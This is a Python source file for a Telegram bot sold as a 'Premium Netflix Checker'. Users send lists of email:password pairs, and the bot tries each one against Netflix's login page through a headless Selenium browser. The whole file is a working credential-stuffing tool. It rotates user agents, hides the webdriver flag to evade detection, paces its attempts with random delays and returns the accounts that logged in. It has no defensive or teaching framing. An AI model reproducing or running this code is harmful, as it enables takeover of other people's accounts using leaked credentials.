#An0nOtF Premium Netflix Checker 💎 Coded and developed in KENYA 🇰🇪 254🇰🇪
#credits to @unknownnumeralx. The genius behind this Premium Script 💎
#Jibambe
import os
import logging
import time
import random
import asyncio
from shutil import which
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.common.exceptions import WebDriverException, TimeoutException
import telegram
import requests
import socket

# Colorful logging setup for deployment only
class GreenFormatter(logging.Formatter):
    GREEN = '\x1b[38;5;82m'
    RESET = '\x1b[0m'
    
    def format(self, record):
        # Only color deployment-related logs
        if any(keyword in record.getMessage().lower() for keyword in [
            'starting', 'developed by', 'geckodriver', 'application started', 
            'bot is now running', 'use /start', 'enhanced firefox driver'
        ]):
            formatted_msg = f"{self.GREEN}{record.msg}{self.RESET}"
            record.msg = formatted_msg
        return super().format(record)

# Set up logging
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)

# Remove existing handlers if any
for handler in logger.handlers[:]:
    logger.removeHandler(handler)

# Create handler with green formatter for deployment logs
ch = logging.StreamHandler()
ch.setLevel(logging.INFO)
ch.setFormatter(GreenFormatter())
logger.addHandler(ch)

class NetflixCheckerBot:
    def __init__(self, token):
        self.token = token
        self.application = Application.builder().token(token).build()
        self.user_agents = self.get_user_agents()
        self.geckodriver_path = which("geckodriver")
        self.working_accounts = []  # Store working accounts
        self.setup_handlers()
        
    def get_user_agents(self):
        return [
            'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
        ]
    
    def get_random_user_agent(self):
        return random.choice(self.user_agents)
    
    def check_geckodriver_installation(self):
        """Check if geckodriver is properly installed"""
        # Check in PATH first
        if self.geckodriver_path:
            logger.info("GeckoDriver found at: %s", self.geckodriver_path)
            return True
        # Check common installation locations
        elif os.path.exists("/usr/local/bin/geckodriver"):
            self.geckodriver_path = "/usr/local/bin/geckodriver"
            logger.info("GeckoDriver found at: %s", self.geckodriver_path)
            return True
        elif os.path.exists("/app/.geckodriver/bin/geckodriver"):
            self.geckodriver_path = "/app/.geckodriver/bin/geckodriver"
            logger.info("GeckoDriver found at: %s", self.geckodriver_path)
            return True
        else:
            logger.error("GeckoDriver not found")
            return False

    def check_network_connectivity(self):
        """Check if we can reach Netflix"""
        logger.info("🔍 Running network diagnostics...")
        
        # Test DNS resolution first
        try:
            socket.gethostbyname('www.netflix.com')
            logger.info("✅ DNS resolution: GOOD")
        except:
            logger.error("❌ DNS resolution: FAILED")
            return False
        
        # Test basic connectivity with requests
        try:
            response = requests.get("https://www.netflix.com", timeout=10)
            if response.status_code == 200:
                logger.info("✅ Network connectivity: GOOD")
                return True
            else:
                logger.warning("⚠️ Netflix returned status: %s", response.status_code)
        except Exception as e:
            logger.warning("⚠️ Direct HTTP request failed: %s", e)
        
        return True  # Still try even if requests fail
    
    def get_stealth_driver(self):
        """Create Firefox driver with enhanced network stability"""
        if not self.geckodriver_path:
            raise Exception("GeckoDriver not found. Please install it with: pkg install geckodriver")
        
        firefox_options = FirefoxOptions()
        
        # ENHANCED NETWORK OPTIONS
        firefox_options.add_argument("--headless")
        firefox_options.add_argument("--no-sandbox")
        firefox_options.add_argument("--disable-dev-shm-usage")
        firefox_options.add_argument("--disable-gpu")
        
        # IMPROVED NETWORK SETTINGS
        firefox_options.set_preference("network.http.use-cache", True)
        firefox_options.set_preference("browser.cache.disk.enable", True)
        firefox_options.set_preference("browser.cache.memory.enable", True)
        firefox_options.set_preference("network.dns.disablePrefetch", False)
        firefox_options.set_preference("network.http.pipelining", True)
        firefox_options.set_preference("network.http.proxy.pipelining", True)
        
        # REDUCE TIMEOUTS FOR FASTER FAILOVER
        firefox_options.set_preference("network.http.connection-timeout", 10)
        firefox_options.set_preference("network.http.connection-retry-timeout", 10)
        firefox_options.set_preference("network.websocket.timeout.ping.request", 10)
        
        # For cloud environments
        firefox_options.add_argument("--disable-software-rasterizer")
        firefox_options.add_argument("--disable-extensions")
        firefox_options.add_argument("--disable-plugins")
        
        # Set user agent
        user_agent = self.get_random_user_agent()
        firefox_options.set_preference("general.useragent.override", user_agent)
        
        # Anti-detection
        firefox_options.set_preference("dom.webdriver.enabled", False)
        firefox_options.set_preference("useAutomationExtension", False)
        
        try:
            logger.info("🚀 Starting Enhanced Firefox Driver...")
            
            service = FirefoxService(
                executable_path=self.geckodriver_path,
                log_path=os.devnull
            )
            
            driver = webdriver.Firefox(service=service, options=firefox_options)
            
            # REDUCED TIMEOUTS FOR BETTER ERROR HANDLING
            driver.set_page_load_timeout(25)  # Reduced from 45
            driver.set_script_timeout(20)
            driver.implicitly_wait(5)
            
            # Set window size
            driver.set_window_size(390, 844)
            
            logger.info("✅ Enhanced Firefox Driver started successfully!")
            return driver
            
        except Exception as e:
            logger.error(f"❌ Failed to start Firefox: {e}")
            raise Exception(f"Firefox startup failed: {e}")

    def setup_handlers(self):
        """Setup Telegram bot command and message handlers with error handling"""
        self.application.add_handler(CommandHandler("start", self.start_command))
        self.application.add_handler(CommandHandler("status", self.status_command))
        self.application.add_handler(MessageHandler(filters.Document.ALL, self.handle_document))
        self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_text_accounts))
        
        # Add error handler for conflicts
        self.application.add_error_handler(self.error_handler)

    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle Telegram API errors"""
        error = context.error
        
        if isinstance(error, telegram.error.Conflict):
            logger.error("❌ Multiple bot instances detected! Stopping...")
            # Gracefully shutdown
            await self.application.stop()
            await self.application.shutdown()
            logger.info("✅ Bot stopped due to conflict. Please restart only one instance.")
        elif isinstance(error, telegram.error.NetworkError):
            logger.warning("🌐 Network error, retrying...")
        else:
            logger.error(f"⚠️ Unexpected error: {error}")

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command"""
        driver_status = "✅ GeckoDriver READY!" if self.check_geckodriver_installation() else "❌ GeckoDriver NOT FOUND!"
        
        # Check network connectivity
        network_status = "✅ Network READY!" if await asyncio.get_event_loop().run_in_executor(None, self.check_network_connectivity) else "⚠️ Network issues detected"
        
        try:
            await update.message.reply_animation(
                animation="https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExdzE5YzhidnViY3hydzM1d242azE3NWwydndsMjJrbmN3MTFwcHJndSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/JnvHE3lTHPr3WrSsrl/giphy.gif",
                caption=f"🎬 **💎An0nOtF Premium Netflix Checker💎**\n\n"
                       f"{driver_status}\n"
                       f"{network_status}\n\n"
                       "📁 Send me a .txt file OR direct text with accounts in format:\n"
                       "`email:password`\n\n"
                       "Each account on a new line.\n\n"
                       "⚡ **Status:** ✅ READY\n"
                       "👨‍💻 **DEV:** @unknownnumeralx\n\n"
                       "━━━━━━━━━━━━━━━━━━━━━━━━",
                parse_mode='Markdown'
            )
        except:
            await update.message.reply_text(
                f"🎬 **💎An0nOtF Premium Netflix Checker💎**\n\n"
                f"{driver_status}\n"
                f"{network_status}\n\n"
                "📁 Send me a .txt file OR direct text with accounts in format:\n"
                "`email:password`\n\n"
                "Each account on a new line.\n\n"
                "⚡ **Status:** ✅ READY\n"
                "👨‍💻 **DEV:** @unknownnumeralx\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━",
                parse_mode='Markdown'
            )

    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /status command"""
        driver_status = "✅ GeckoDriver READY!" if self.check_geckodriver_installation() else "❌ GeckoDriver NOT FOUND!"
        network_status = "✅ Network READY!" if await asyncio.get_event_loop().run_in_executor(None, self.check_network_connectivity) else "⚠️ Network issues detected"
        
        await update.message.reply_text(
            f"🤖 **Bot Status**\n\n"
            f"{driver_status}\n"
            f"{network_status}\n"
            f"🔧 **System:** Operational\n"
            f"⚡ **Performance:** Enhanced\n"
            f"👨‍💻 **DEV:** @unknownnumeralx\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━"
        )

    def create_progress_bar(self, percentage, length=20):
        """Create a visual progress bar"""
        filled = int(length * percentage / 100)
        empty = length - filled
        bar = "█" * filled + "▒" * empty
        return f"[{bar}] {percentage}%"

    async def update_progress(self, update: Update, context: ContextTypes.DEFAULT_TYPE, current: int, total: int, working_count: int = 0, failed_count: int = 0):
        """Update progress message"""
        percentage = min(100, int((current / total) * 100))
        progress_bar = self.create_progress_bar(percentage)
        
        status_message = (
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "[↯💎] NETFLIX ACCOUNTS 𝘾𝙃𝙀𝘾𝙆 𝙎𝙏𝘼𝙏𝙐𝙎💎\n\n"
            f"[↯] 𝙎𝙩𝙖𝙩𝙪𝙨 ↯ Processing ({total} accounts) \n"
            f"{progress_bar}\n"
            f"[↯] 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 ↯ {working_count} found\n"
            f"[↯] 𝙁𝙖𝙞𝙡𝙚𝙙 ↯ {failed_count} accounts\n"
            f"[↯] 𝘿𝙀𝙑   ↯ @unknownnumeralx \n"
            "━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        
        if 'progress_message_id' in context.user_data:
            try:
                await context.bot.edit_message_text(
                    chat_id=update.effective_chat.id,
                    message_id=context.user_data['progress_message_id'],
                    text=status_message
                )
            except Exception as e:
                new_message = await update.message.reply_text(status_message)
                context.user_data['progress_message_id'] = new_message.message_id
        else:
            new_message = await update.message.reply_text(status_message)
            context.user_data['progress_message_id'] = new_message.message_id

    async def cleanup_progress(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Clean up progress message"""
        if 'progress_message_id' in context.user_data:
            try:
                await context.bot.delete_message(
                    chat_id=update.effective_chat.id,
                    message_id=context.user_data['progress_message_id']
                )
                del context.user_data['progress_message_id']
            except Exception as e:
                logger.warning("Could not delete progress message: %s", e)

    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle document messages (txt files)"""
        user = update.message.from_user
        logger.info("User %s sent a file", user.first_name)

        if not update.message.document.file_name.endswith('.txt'):
            await update.message.reply_text("❌ Please send a .txt file")
            return

        await update.message.reply_text("📥 File received! Starting account verification...")

        try:
            file = await update.message.document.get_file()
            file_path = f"temp_{update.message.document.file_name}"
            await file.download_to_drive(file_path)

            working_accounts = await self.process_accounts(file_path, update, context)

            # Send final results only
            if working_accounts:
                result_message = self.format_results(working_accounts)
                if len(result_message) > 4000:
                    parts = [result_message[i:i+4000] for i in range(0, len(result_message), 4000)]
                    for part in parts:
                        await update.message.reply_text(part, parse_mode='Markdown')
                else:
                    await update.message.reply_text(result_message, parse_mode='Markdown')
            else:
                await update.message.reply_text("❌ No working accounts found.")

            if os.path.exists(file_path):
                os.remove(file_path)
                
            await self.cleanup_progress(update, context)

        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
            logger.error("Error: %s", str(e))
            await self.cleanup_progress(update, context)

    async def handle_text_accounts(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle text messages with accounts"""
        user = update.message.from_user
        text = update.message.text.strip()
        logger.info("User %s sent text accounts", user.first_name)

        if ':' not in text and '\n' not in text:
            await update.message.reply_text(
                "📁 Send me accounts in format:\n"
                "`email:password`\n\n"
                "Example:\n"
                "user1@gmail.com:password123\n"
                "user2@yahoo.com:pass456\n"
                "user3@hotmail.com:secret789\n\n"
                "Or send a .txt file with the same format.",
                parse_mode='Markdown'
            )
            return

        await update.message.reply_text("📥 Text accounts received! Starting verification...")

        file_path = f"temp_text_{user.id}_{int(time.time())}.txt"
        try:
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(text)

            working_accounts = await self.process_accounts(file_path, update, context)

            # Send final results only
            if working_accounts:
                result_message = self.format_results(working_accounts)
                if len(result_message) > 4000:
                    parts = [result_message[i:i+4000] for i in range(0, len(result_message), 4000)]
                    for part in parts:
                        await update.message.reply_text(part, parse_mode='Markdown')
                else:
                    await update.message.reply_text(result_message, parse_mode='Markdown')
            else:
                await update.message.reply_text("❌ No working accounts found.")

        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
            logger.error("Error: %s", str(e))
        finally:
            if os.path.exists(file_path):
                os.remove(file_path)
            await self.cleanup_progress(update, context)

    async def process_accounts(self, file_path, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Process accounts from file with network check"""
        
        # Check network before starting
        network_ok = await asyncio.get_event_loop().run_in_executor(
            None, self.check_network_connectivity
        )
        
        if not network_ok:
            await update.message.reply_text(
                "❌ **Network Connection Issue**\n\n"
                "Cannot reach Netflix servers. Possible reasons:\n"
                "• Network firewall blocking Netflix\n"
                "• DNS resolution issues\n"
                "• IP address blocked by Netflix\n"
                "• Server network restrictions\n\n"
                "Trying anyway with enhanced retry logic..."
            )
        
        working_accounts = []
        failed_accounts = 0
        
        try:
            with open(file_path, 'r', encoding='utf-8') as file:
                accounts = [line.strip() for line in file if ':' in line.strip()]
        except Exception as e:
            await update.message.reply_text(f"❌ Error reading file: {str(e)}")
            return []
        
        total_accounts = len(accounts)
        if total_accounts == 0:
            await update.message.reply_text("❌ No valid accounts found. Format should be email:password")
            return []
        
        # Large batch warning
        if total_accounts > 500:
            await update.message.reply_text(
                f"⚠️ **Large Batch Detected**: {total_accounts} accounts\n"
                f"⏰ **Estimated Time**: {total_accounts * 20 // 60} minutes\n"
                f"🔧 **Optimizing for large batch...**"
            )
            
        await update.message.reply_text(f"🔍 Found {total_accounts} accounts to test...")
        await self.update_progress(update, context, 0, total_accounts, len(working_accounts), failed_accounts)

        for i, line in enumerate(accounts, 1):
            try:
                email, password = line.split(':', 1)
                email = email.strip()
                password = password.strip()
            except ValueError:
                logger.warning("Invalid format: %s", line)
                failed_accounts += 1
                continue
            
            await self.update_progress(update, context, i, total_accounts, len(working_accounts), failed_accounts)
            
            # Safety delay
            if i > 1:
                delay = random.uniform(3.0, 6.0)
                await asyncio.sleep(delay)
            
            try:
                success, message = await asyncio.get_event_loop().run_in_executor(
                    None, self.test_netflix_account_detailed, email, password
                )
                if success:
                    working_accounts.append((email, password))
                    logger.info("🎉 WORKING: %s", email)
                else:
                    failed_accounts += 1
                    logger.info("❌ FAILED: %s - %s", email, message)
                    
            except Exception as e:
                failed_accounts += 1
                logger.error("🚨 ERROR: %s - %s", email, e)

        # Final results
        logger.info("📊 FINAL: %d working, %d failed out of %d total", 
                    len(working_accounts), failed_accounts, total_accounts)
        
        if working_accounts:
            logger.info("✅ WORKING ACCOUNTS:")
            for email, password in working_accounts:
                logger.info("   📧 %s", email)
        
        return working_accounts

    def test_netflix_account_detailed(self, email, password):
        """Netflix account testing with improved navigation"""
        driver = None
        try:
            driver = self.get_stealth_driver()
            logger.info("Testing: %s", email)
            
            # IMPROVED NAVIGATION WITH ALTERNATE URLS
            netflix_urls = [
                "https://www.netflix.com/login",
                "https://netflix.com/login",
                "https://www.netflix.com/ke/login",
                "https://netflix.com/"
            ]
            
            success = False
            for url_attempt, current_url in enumerate(netflix_urls):
                try:
                    logger.info("Attempting URL: %s (Attempt %d/%d)", current_url, url_attempt + 1, len(netflix_urls))
                    
                    # Set shorter timeout for this attempt
                    driver.set_page_load_timeout(20)
                    driver.get(current_url)
                    
                    # Quick check if page loaded
                    WebDriverWait(driver, 10).until(
                        lambda d: d.execute_script("return document.readyState") == "complete"
                    )
                    
                    # Check if we actually reached Netflix
                    if "netflix" in driver.current_url.lower() or "netflix" in driver.page_source.lower():
                        logger.info("✅ Successfully loaded Netflix page")
                        success = True
                        break
                    else:
                        logger.warning("⚠️ Page loaded but doesn't appear to be Netflix")
                        
                except TimeoutException:
                    logger.warning("⚠️ Timeout loading: %s", current_url)
                    continue
                except Exception as e:
                    logger.warning("⚠️ Error loading %s: %s", current_url, e)
                    continue
            
            if not success:
                logger.error("❌ Failed to load Netflix after all URL attempts")
                return False, "Cannot reach Netflix servers"
            
            # Continue with login process...
            time.sleep(2)
            
            # Fill login form
            logger.info("Filling login form...")
            
            # Find email field with improved selectors
            email_selectors = [
                (By.ID, "id_userLoginId"),
                (By.NAME, "userLoginId"),
                (By.CSS_SELECTOR, "input[type='email']"),
                (By.CSS_SELECTOR, "input[name='userLoginId']"),
                (By.CSS_SELECTOR, "input[data-uia='login-field']"),
                (By.CSS_SELECTOR, "input[type='text']")  # Fallback
            ]
            
            email_field = None
            for by, selector in email_selectors:
                try:
                    email_field = WebDriverWait(driver, 10).until(
                        EC.presence_of_element_located((by, selector))
                    )
                    logger.info("✅ Found email field with %s: %s", by, selector)
                    break
                except TimeoutException:
                    continue
            
            if not email_field:
                # TRY TO FIND ANY INPUT FIELD AS FALLBACK
                try:
                    inputs = driver.find_elements(By.TAG_NAME, "input")
                    for input_field in inputs:
                        if input_field.is_displayed() and input_field.is_enabled():
                            input_type = input_field.get_attribute("type")
                            if input_type in ["email", "text"]:
                                email_field = input_field
                                logger.info("✅ Found fallback input field")
                                break
                except:
                    pass
            
            if not email_field:
                logger.error("❌ Could not find email field")
                return False, "Login form not found"
            
            email_field.clear()
            email_field.send_keys(email)
            time.sleep(1)
            
            # Find password field
            password_selectors = [
                (By.ID, "id_password"),
                (By.NAME, "password"),
                (By.CSS_SELECTOR, "input[type='password']"),
                (By.CSS_SELECTOR, "input[name='password']"),
                (By.CSS_SELECTOR, "input[data-uia='password-field']")
            ]
            
            password_field = None
            for by, selector in password_selectors:
                try:
                    password_field = WebDriverWait(driver, 10).until(
                        EC.presence_of_element_located((by, selector))
                    )
                    logger.info("✅ Found password field with %s: %s", by, selector)
                    break
                except TimeoutException:
                    continue
            
            if not password_field:
                logger.error("❌ Could not find password field")
                return False, "Password field not found"
            
            password_field.clear()
            password_field.send_keys(password)
            time.sleep(1)
            
            # Find login button
            button_selectors = [
                (By.CSS_SELECTOR, "button[type='submit']"),
                (By.CSS_SELECTOR, "button[data-uia='login-submit-button']"),
                (By.CLASS_NAME, "login-button"),
                (By.CSS_SELECTOR, ".btn.login-button.btn-submit.btn-small"),
                (By.CSS_SELECTOR, "button")  # Fallback to any button
            ]
            
            login_btn = None
            for by, selector in button_selectors:
                try:
                    login_btn = WebDriverWait(driver, 10).until(
                        EC.element_to_be_clickable((by, selector))
                    )
                    logger.info("✅ Found login button with %s: %s", by, selector)
                    break
                except TimeoutException:
                    continue
            
            if not login_btn:
                logger.error("❌ Could not find login button")
                return False, "Login button not found"
            
            login_btn.click()
            logger.info("✅ Login button clicked...")
            
            # IMPROVED WAIT FOR LOGIN RESULT
            logger.info("Waiting for login result...")
            time.sleep(8)  # Increased wait time for login processing
            
            # 🆕 ENHANCED SUCCESS DETECTION - MULTIPLE CRITERIA
            current_url = driver.current_url
            page_title = driver.title.lower()
            page_source = driver.page_source.lower()
            
            logger.info("Final URL: %s", current_url)
            logger.info("Page Title: %s", page_title)
            
            # ✅ SUCCESS CRITERIA 1: Redirected to /browse
            if "/browse" in current_url:
                logger.info("🎉 SUCCESS: %s - Redirected to /browse (VALID ACCOUNT)", email)
                return True, "Valid Netflix account"
            
            # ✅ SUCCESS CRITERIA 2: Netflix homepage (logged in)
            if "netflix.com" in current_url and "/browse" not in current_url:
                # Check if we're on the main Netflix page (logged in state)
                if any(keyword in page_source for keyword in ["who's watching", "profiles", "continue watching"]):
                    logger.info("🎉 SUCCESS: %s - On Netflix homepage with profiles (VALID ACCOUNT)", email)
                    return True, "Valid Netflix account"
            
            # ✅ SUCCESS CRITERIA 3: Account management page
            if "/YourAccount" in current_url or "account" in current_url:
                logger.info("🎉 SUCCESS: %s - Redirected to account page (VALID ACCOUNT)", email)
                return True, "Valid Netflix account"
            
            # ✅ SUCCESS CRITERIA 4: Check for profile selection
            try:
                profiles = driver.find_elements(By.CSS_SELECTOR, "[data-uia='profile-name'], .profile-name, .choose-profile")
                if profiles:
                    logger.info("🎉 SUCCESS: %s - Profile selection screen (VALID ACCOUNT)", email)
                    return True, "Valid Netflix account"
            except:
                pass
            
            # ❌ FAILURE: Still on login page or error page
            if "login" in current_url or "signin" in current_url:
                # Check for error messages
                error_indicators = [
                    "sorry, we can't find an account with this email address",
                    "incorrect password",
                    "your account looks unfamiliar",
                    "error",
                    "invalid"
                ]
                
                for error in error_indicators:
                    if error in page_source:
                        logger.info("❌ FAIL: %s - %s", email, error)
                        return False, error
                
                logger.info("❌ FAIL: %s - Invalid credentials (stayed on login page)", email)
                return False, "Invalid credentials"
            
            # ❌ UNKNOWN STATE
            logger.info("❌ FAIL: %s - Unknown login state", email)
            return False, "Unknown login state"
            
        except Exception as e:
            logger.error("🚨 ERROR testing %s: %s", email, e)
            
            # CLEAR COOKIES even if error occurs
            if driver:
                try:
                    driver.delete_all_cookies()
                    logger.info("✅ Cookies cleared after error")
                except:
                    pass
                    
            return False, f"Error: {str(e)}"
        finally:
            if driver:
                try:
                    # DOUBLE CLEANUP: Clear cookies again before quitting
                    driver.delete_all_cookies()
                    logger.info("✅ Final cookie cleanup before driver quit")
                    
                    driver.quit()
                    logger.info("Driver closed")
                except Exception as e:
                    logger.warning("⚠️ Error during cleanup: %s", e)

    def format_results(self, working_accounts):
        """Format working accounts for display"""
        if not working_accounts:
            return "❌ No working accounts found."
        
        result = f"✅ **💎 WORKING ACCOUNTS FOUND ({len(working_accounts)}):** 💎\n\n"
        
        for i, (email, password) in enumerate(working_accounts, 1):
            result += f"{i}. 📧 `{email}`\n   🔑 `{password}`\n\n"
        
        result += "🎉 **Testing completed successfully!**\n"
        result += "👨‍💻 **DEV:** @unknownnumeralx\n"
        result += "━━━━━━━━━━━━━━━━━━━━━━━━"
        return result

    async def on_startup(self, application):
        """Called when the bot starts"""
        logger.info("Application started successfully!")
        logger.info("Bot is now running and ready to receive commands")
        logger.info("Use /start to begin checking Netflix accounts")
        logger.info("━━━━━━━━━━━━━━━━━━━━━━━━")

    def run(self):
        """Run the bot with conflict prevention"""
        logger.info("Starting 💎An0nOtF Premium Netflix Checker💎...")
        logger.info("Developed by: @unknownnumeralx")
        logger.info("Enhanced Firefox Driver | Fast Checking | Premium Results")
        logger.info("━━━━━━━━━━━━━━━━━━━━━━━━")
        
        if self.check_geckodriver_installation():
            logger.info("GeckoDriver is installed and ready!")
        else:
            logger.warning("GeckoDriver not found. Users will be notified.")
        
        # Prevent multiple instances with drop_pending_updates
        self.application.run_polling(
            drop_pending_updates=True,  # Clear any pending updates
            allowed_updates=Update.ALL_TYPES,
            close_loop=False
        )

def get_bot_token():
    """Get bot token from multiple sources with priority"""
    
    # 🎯 METHOD 1: Environment variable (for cloud deployment)
    env_token = os.environ.get('BOT_TOKEN')
    if env_token and env_token != "YOUR_BOT_TOKEN_HERE":
        logger.info("✅ Bot token loaded from environment variable")
        return env_token
    
    # 🎯 METHOD 2: Config file in SAME directory (for local development)
    try:
        # Check if config.py exists in current directory
        if os.path.exists("config.py"):
            # Import from current directory
            import importlib.util
            spec = importlib.util.spec_from_file_location("config", "config.py")
            config_module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(config_module)
            
            if hasattr(config_module, 'BOT_TOKEN') and config_module.BOT_TOKEN and config_module.BOT_TOKEN != "YOUR_BOT_TOKEN_HERE":
                logger.info("✅ Bot token loaded from config.py in current directory")
                return config_module.BOT_TOKEN
            else:
                logger.warning("❌ config.py found but BOT_TOKEN is not set properly")
        else:
            logger.warning("❌ config.py not found in current directory")
    except Exception as e:
        logger.warning("❌ Error reading config.py: %s", e)
    
    # 🎯 METHOD 3: Hardcoded token (for quick testing)
    HARDCODED_TOKEN = "YOUR_BOT_TOKEN_HERE"  # You can put token directly here
    if HARDCODED_TOKEN and HARDCODED_TOKEN != "YOUR_BOT_TOKEN_HERE":
        logger.info("✅ Bot token loaded from hardcoded value")
        return HARDCODED_TOKEN
    
    # Token not found
    return None

def setup_bot_token():
    """Interactive setup for bot token"""
    print("\n" + "="*50)
    print("🤖 NETFLIX CHECKER BOT SETUP")
    print("="*50)
    
    # Check if config.py already exists
    if os.path.exists("config.py"):
        print("✅ config.py found! Checking token...")
        try:
            import importlib.util
            spec = importlib.util.spec_from_file_location("config", "config.py")
            config_module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(config_module)
            
            if hasattr(config_module, 'BOT_TOKEN') and config_module.BOT_TOKEN and config_module.BOT_TOKEN != "YOUR_BOT_TOKEN_HERE":
                print("✅ Valid token found in config.py!")
                return config_module.BOT_TOKEN
            else:
                print("❌ config.py exists but token is not set properly")
        except:
            print("❌ Error reading existing config.py")
    
    # Ask user for token
    print("\n🔑 BOT TOKEN SETUP")
    print("Get your token from @BotFather on Telegram")
    print("\nPlease enter your bot token:")
    
    token = input("Token: ").strip()
    
    if not token or token == "YOUR_BOT_TOKEN_HERE":
        print("❌ Invalid token provided!")
        return None
    
    # Create config.py with the token
    try:
        with open("config.py", "w") as f:
            f.write(f'# Netflix Checker Bot Configuration\n')
            f.write(f'BOT_TOKEN = "{token}"\n')
            f.write(f'\n# Optional Settings\n')
            f.write(f'# CHECK_DELAY = 2.0\n')
            f.write(f'# MAX_ACCOUNTS = 1000\n')
            f.write(f'# LOG_LEVEL = "INFO"\n')
        
        print("✅ config.py created successfully!")
        print("✅ Bot token saved securely!")
        return token
        
    except Exception as e:
        print(f"❌ Error creating config.py: {e}")
        return None

if __name__ == "__main__":
    # First try to get token automatically
    BOT_TOKEN = get_bot_token()
    
    # If not found, start interactive setup
    if not BOT_TOKEN:
        print("❌ BOT_TOKEN not found!")
        BOT_TOKEN = setup_bot_token()
    
    # If still not found, exit
    if not BOT_TOKEN:
        print("\n🚫 Cannot start bot without token!")
        print("\n💡 Alternative setup methods:")
        print("1. Create config.py manually with: BOT_TOKEN = 'your_token'")
        print("2. Set environment variable: export BOT_TOKEN='your_token'")
        print("3. Edit app.py and set HARDCODED_TOKEN = 'your_token'")
        print("\n🤖 Get token from @BotFather on Telegram")
        exit(1)
    
    # Start the bot
    print("\n🎉 Starting 💎An0nOtF Netflix Premium Checker Bot...")
    bot = NetflixCheckerBot(BOT_TOKEN)
    bot.application.post_init = bot.on_startup
    bot.run()
